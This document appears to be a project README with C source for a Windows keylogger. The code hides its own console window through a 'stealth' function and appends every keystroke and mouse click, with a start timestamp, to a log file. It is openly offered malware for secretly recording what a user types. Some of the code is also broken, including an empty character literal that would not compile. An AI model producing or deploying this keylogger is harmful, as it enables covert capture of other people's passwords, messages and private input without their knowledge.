# Keylogger
Saves inputs of a user - Coded in c

#include "header.h"

void start(char *file)
{
    time_t startTime = time(0);

    FILE * OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    fprintf(OUTPUT_FILE, "\n### START LOGGING AT: ");
    fputs(ctime(&startTime), OUTPUT_FILE);

    fclose(OUTPUT_FILE);
}

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);      //Stealth identified as window "ConsoleWindowClass"
    ShowWindow(stealth, 0);     //Hides the window
}

int save(int key_stroke, char *file)
{
    FILE * OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    if(key_stroke >= 39 && key_stroke <= 64)    //Key 0-9
    {
        if(!GetAsyncKeyState(VK_SHIFT))
        {
            switch(key_stroke)
            {
            case 0x30:
                fprintf(OUTPUT_FILE, "à");
                break;
            case 0x31:
                fprintf(OUTPUT_FILE, "&");
                break;
            case 0x32:
                fprintf(OUTPUT_FILE, "é");
                break;
            case 0x33:
                fprintf(OUTPUT_FILE, "[HASHTAG]");
                break;
            case 0x34:
                fprintf(OUTPUT_FILE, "'");
                break;
            case 0x35:
                fprintf(OUTPUT_FILE, "(");
                break;
            case 0x36:
                fprintf(OUTPUT_FILE, "-");
                break;
            case 0x37:
                fprintf(OUTPUT_FILE, "è");
                break;
            case 0x38:
                fprintf(OUTPUT_FILE, "_");
                break;
            case 0x39:
                fprintf(OUTPUT_FILE, "ç");
                break;
            }
        }
    }

    switch (key_stroke)
    {
    case 8:
        fprintf(OUTPUT_FILE, "[BACKSPACE]");
        break;
    case 13:
        fprintf(OUTPUT_FILE, "\n");
        break;
    case 32:
        fprintf(OUTPUT_FILE, " ");
        break;
    case VK_TAB:
        fprintf(OUTPUT_FILE, "[TAB]");
        break;
    case VK_ESCAPE:
        fprintf(OUTPUT_FILE, "[ESCAPE]");
        break;
    case VK_END:
        fprintf(OUTPUT_FILE, "[END]");
        break;
    case VK_HOME:
        fprintf(OUTPUT_FILE, "[HOME]");
        break;
    case VK_LEFT:
        fprintf(OUTPUT_FILE, "[LEFT]");
        break;
    case VK_UP:
        fprintf(OUTPUT_FILE, "[UP]");
        break;
    case VK_RIGHT:
        fprintf(OUTPUT_FILE, "[RIGHT]");
        break;
    case VK_DOWN:
        fprintf(OUTPUT_FILE, "[DOWN]");
        break;
    /*
    case 190 || 110:
    fprintf(OUTPUT_FILE, ".");
    break;*/

    /* */
    case VK_CANCEL:
        fprintf(OUTPUT_FILE, "[Cancel]");
        break;
    case VK_LCONTROL:
        fprintf(OUTPUT_FILE, "[LCtrl]");
        break;
    case VK_RCONTROL:
        fprintf(OUTPUT_FILE, "[RCtrl]");
        break;
    case VK_LMENU:
        fprintf(OUTPUT_FILE, "[LAlt]");
        break;
    case VK_RMENU:
        fprintf(OUTPUT_FILE, "[RAlt]");
        break;
    case VK_LWIN:
        fprintf(OUTPUT_FILE, "[LWindows]");
        break;
    case VK_RWIN:
        fprintf(OUTPUT_FILE, "[RWindows]");
        break;
    case VK_APPS:
        fprintf(OUTPUT_FILE, "[Application]");
        break;
    case VK_SNAPSHOT:
        fprintf(OUTPUT_FILE, "[ScreenShot]");
        break;
    case VK_INSERT:
        fprintf(OUTPUT_FILE, "[Insert]");
        break;
    case VK_PAUSE:
        fprintf(OUTPUT_FILE, "[Pause]");
        break;
    case VK_VOLUME_MUTE:
        fprintf(OUTPUT_FILE, "[VolumeMute]");
        break;
    case VK_VOLUME_DOWN:
        fprintf(OUTPUT_FILE, "[VolumeDown]");
        break;
    case VK_VOLUME_UP:
        fprintf(OUTPUT_FILE, "[VolumeUp]");
        break;
    case VK_SELECT:
        fprintf(OUTPUT_FILE, "[Select]");
        break;
    case VK_HELP:
        fprintf(OUTPUT_FILE, "[Help]");
        break;
    case VK_EXECUTE:
        fprintf(OUTPUT_FILE, "[Execute]");
        break;
    case VK_DELETE:
        fprintf(OUTPUT_FILE, "[Delete]");
        break;
    case VK_CLEAR:
        fprintf(OUTPUT_FILE, "[Clear]");
        break;
    case VK_LSHIFT:
        fprintf(OUTPUT_FILE, "[LShift]");
        break;
    case VK_RSHIFT:
        fprintf(OUTPUT_FILE, "[Rshift]");
        break;
    case VK_CAPITAL:
        fprintf(OUTPUT_FILE, "[CapLock]");
        break;
    case VK_NUMLOCK:
        fprintf(OUTPUT_FILE, "[NumLock]");
        break;
    case VK_SCROLL:
        fprintf(OUTPUT_FILE, "[ScrollLock]");
        break;
    case VK_PLAY:
        fprintf(OUTPUT_FILE, "[Play]");
        break;
    case VK_ZOOM:
        fprintf(OUTPUT_FILE, "[Zoom]");
        break;
    case VK_DIVIDE:
        fprintf(OUTPUT_FILE, "[/]");
        break;
    case VK_MULTIPLY:
        fprintf(OUTPUT_FILE, "[*]");
        break;
    case VK_SUBTRACT:
        fprintf(OUTPUT_FILE, "[-]");
        break;
    case VK_ADD:
        fprintf(OUTPUT_FILE, "[+]");
        break;
    case VK_PRIOR:
        fprintf(OUTPUT_FILE, "[PageUp]");
        break;
    case VK_NEXT:
        fprintf(OUTPUT_FILE, "[PageDown]");
        break;
    case VK_F1:
        fprintf(OUTPUT_FILE, "[F1]");
        break;
    case VK_F2:
        fprintf(OUTPUT_FILE, "[F2]");
        break;
    case VK_F3:
        fprintf(OUTPUT_FILE, "[F3]");
        break;
    case VK_F4:
        fprintf(OUTPUT_FILE, "[F4]");
        break;
    case VK_F5:
        fprintf(OUTPUT_FILE, "[F5]");
        break;
    case VK_F6:
        fprintf(OUTPUT_FILE, "[F6]");
        break;
    case VK_F7:
        fprintf(OUTPUT_FILE, "[F7]");
        break;
    case VK_F8:
        fprintf(OUTPUT_FILE, "[F8]");
        break;
    case VK_F9:
        fprintf(OUTPUT_FILE, "[F9]");
        break;
    case VK_F10:
        fprintf(OUTPUT_FILE, "[F10]");
        break;
    case VK_F11:
        fprintf(OUTPUT_FILE, "[F11]");
        break;
    case VK_F12:
        fprintf(OUTPUT_FILE, "[F12]");
        break;
    case VK_F13:
        fprintf(OUTPUT_FILE, "[F13]");
        break;
    case VK_F14:
        fprintf(OUTPUT_FILE, "[F14]");
        break;
    case VK_F15:
        fprintf(OUTPUT_FILE, "[F15]");
        break;
    case VK_F16:
        fprintf(OUTPUT_FILE, "[F16]");
        break;
    case VK_F17:
        fprintf(OUTPUT_FILE, "[F17]");
        break;
    case VK_F18:
        fprintf(OUTPUT_FILE, "[F18]");
        break;
    case VK_F19:
        fprintf(OUTPUT_FILE, "[F19]");
        break;
    case VK_F20:
        fprintf(OUTPUT_FILE, "[F20]");
        break;
    case VK_F21:
        fprintf(OUTPUT_FILE, "[F21]");
        break;
    case VK_F22:
        fprintf(OUTPUT_FILE, "[F22]");
        break;
    case VK_F23:
        fprintf(OUTPUT_FILE, "[F23]");
        break;
    case VK_F24:
        fprintf(OUTPUT_FILE, "[F24]");
        break;
    case VK_LBUTTON:
        fprintf(OUTPUT_FILE, "[lClick]");
        break;
    case VK_RBUTTON:
        fprintf(OUTPUT_FILE, "[rClick]");
        break;
    case '':
        // [UNKNOWN character ]
        break;

    default:
        fprintf(OUTPUT_FILE, "%c", key_stroke);
        break;
    }

    fclose(OUTPUT_FILE);
    return 0;
}
